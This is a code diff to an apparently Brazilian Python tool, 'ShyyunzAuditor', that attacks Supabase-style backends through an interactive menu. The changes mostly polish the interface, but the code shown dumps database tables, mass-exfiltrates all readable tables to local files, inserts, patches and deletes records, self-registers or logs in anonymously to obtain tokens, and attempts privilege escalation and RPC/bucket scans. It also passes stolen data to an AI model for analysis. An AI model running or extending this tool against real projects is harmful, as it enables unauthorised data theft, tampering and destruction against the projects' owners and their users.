@@ -288,8 +288,14 @@ class ShyyunzAuditor:
             finally: progress.advance(task_id)
 
     async def run_scan(self, tables, brain=None):
-        async with httpx.AsyncClient(verify=False, http2=True) as client:
-            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
+        async with httpx.AsyncClient(verify=False, http2=True, timeout=10.0) as client:
+            with Progress(
+                SpinnerColumn(), 
+                TextColumn("[progress.description]{task.description}"), 
+                BarColumn(bar_width=40), 
+                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
+                console=console
+            ) as progress:
                 task = progress.add_task("[bold red]Shadow Ops Recon...", total=len(tables))
                 await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables])
 
@@ -359,58 +365,78 @@ async def audit_routine():
     console.print(sum_t)
 
     while True:
-        console.print("\n[bold cyan][1] Dump [3] Signup [4] Storage [6] POST [7] PATCH [8] DEL [9] Anon [E] Escalation [R] RPC [B] Bucket [D] Exfil [K] Brain [0] Sair[/bold cyan]")
-        c = input("\n[S_SEC] Comando: ").strip().upper()
+        menu_text = (
+            "[bold cyan]DADOS E EXFILTRAÇÃO[/bold cyan]\n"
+            "[white][1] Ver Dados (Dump)    [D] Sugar Tudo (Mass Exfil)[/white]\n\n"
+            "[bold cyan]ATAQUE E ESCRITA[/bold cyan]\n"
+            "[white][6] Inserir (POST)      [7] Editar (PATCH)    [8] Deletar (DEL)[/white]\n"
+            "[white][3] Criar Conta        [9] Login Anon        [E] Escalar Privilégios[/white]\n\n"
+            "[bold cyan]EXPLORAÇÃO PROFUNDA[/bold cyan]\n"
+            "[white][R] Scan de RPCs        [B] Scan de Buckets    [K] Menu de Config/Brain[/white]\n\n"
+            "[bold red][0] Voltar / Sair[/bold red]"
+        )
+        console.print(Panel(menu_text, title="PAINEL DE OPERAÇÕES", border_style="cyan"))
+        
+        c = input("\n[SHY_OPS] Selecione uma ação: ").strip().upper()
         if c == "0": return True
         elif c == "1":
             idx = input("Nr: ").strip()
             if idx in table_map:
-                r = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
-                console.print(Panel(json.dumps(r.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
-                if input("Analisar IA? (S/N): ").upper() == "S": console.print(Panel(await brain.analyze_data(table_map[idx]['name'], r.json()), border_style="magenta"))
-        elif c == "E": await auditor.exploit_escalation()
+                try:
+                    r = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
+                    console.print(Panel(json.dumps(r.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
+                    if brain and input("\n[?] Analisar com IA? (S/N): ").upper() == "S":
+                        with console.status("[bold magenta]Cérebro Analítico processando..."):
+                            analysis = await brain.analyze_data(table_map[idx]['name'], r.json())
+                            console.print(Panel(analysis, title="ANÁLISE IA", border_style="magenta"))
+                except Exception as e: console.print(f"[red]Erro ao ler dados: {e}[/red]")
+        elif c == "E": 
+            with console.status("[bold cyan]Tentando escalonamento multi-payload..."):
+                await auditor.exploit_escalation()
         elif c == "R": await auditor.rpc_sniper(brain)
         elif c == "B": await auditor.deep_bucket_scan()
         elif c == "D":
-            out = f"dump_{auditor.project_ref}"; os.makedirs(out, exist_ok=True)
-            async with httpx.AsyncClient() as client:
-                for r in auditor.results:
-                    if r.get('readable'):
-                        resp = await client.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
-                        with open(f"{out}/{r['name']}.json", "w") as f: f.write(json.dumps(resp.json()))
-            console.print(Panel(f"Arquivos salvos em {out}/", title="Exfiltração"))
-        elif c == "K":
-            opt = input("\n[1] Ver Conhecimento [2] Trocar API Key Gemini: ").strip()
-            if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))
-            elif opt == "2":
-                new_key = input("Nova Gemini API Key: ").strip()
-                if new_key: sh_config.set_api_key(new_key); console.print("[green]Configuração salva![/green]")
+            with console.status("[bold green]Iniciando exfiltração em massa..."):
+                out = f"dump_{auditor.project_ref}"; os.makedirs(out, exist_ok=True)
+                async with httpx.AsyncClient() as client:
+                    for r in auditor.results:
+                        if r.get('readable'):
+                            resp = await client.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
+                            with open(f"{out}/{r['name']}.json", "w") as f: f.write(json.dumps(resp.json()))
+                console.print(Panel(f"Arquivos salvos em [bold green]{out}/[/bold green]", title="Exfiltração Concluída"))
         elif c == "6":
             idx = input("Nr: ").strip()
             if idx in table_map:
                 p = prompt_payload()
                 res = await httpx.AsyncClient().post(f"{auditor.base_url}{table_map[idx]['name']}", headers=auditor.headers, json=p)
-                console.print(f"Res ({res.status_code}): {res.text}")
+                console.print(f"Resultado ({res.status_code}): {res.text}")
         elif c == "7":
             idx = input("Nr: ").strip(); f = input("Filtro (ex: id=eq.1): ").strip()
             if idx in table_map:
                 p = prompt_payload()
                 res = await httpx.AsyncClient().patch(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers, json=p)
-                console.print(f"Res ({res.status_code}): {res.text}")
+                console.print(f"Resultado ({res.status_code}): {res.text}")
         elif c == "8":
             idx = input("Nr: ").strip(); f = input("Filtro: ").strip()
             if idx in table_map:
                 res = await httpx.AsyncClient().delete(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers)
-                console.print(f"Res ({res.status_code}): {res.text}")
+                console.print(f"Resultado ({res.status_code}): {res.text}")
         elif c == "3":
-            t = await auditor.exploit_signup()
-            if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green]Autenticado![/green]")
+            with console.status("[bold yellow]Cadastrando novo usuário..."):
+                t = await auditor.exploit_signup()
+                if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green][+] Usuário criado e logado![/green]")
         elif c == "9":
-            async with httpx.AsyncClient() as client:
-                r = await client.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey}, json={})
-                t = r.json().get('access_token')
-                if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green]Anon Logged![/green]")
-        elif c == "K": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))
+            with console.status("[bold blue]Logando anonimamente..."):
+                async with httpx.AsyncClient() as client:
+                    r = await client.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey}, json={})
+                    t = r.json().get('access_token')
+                    if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green][+] Anonimato ativado![/green]")
+        elif c == "K":
+            opt = input("\n[1] Ver Memória [2] Alterar Gemini Key [Enter] Cancelar: ").strip()
+            if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))
+            elif opt == "2":
+                key = input("Nova Key: ").strip()
+                if key: sh_config.set_api_key(key)
 
 async def main():
     # Verificação Inicial Inteligente de API Key
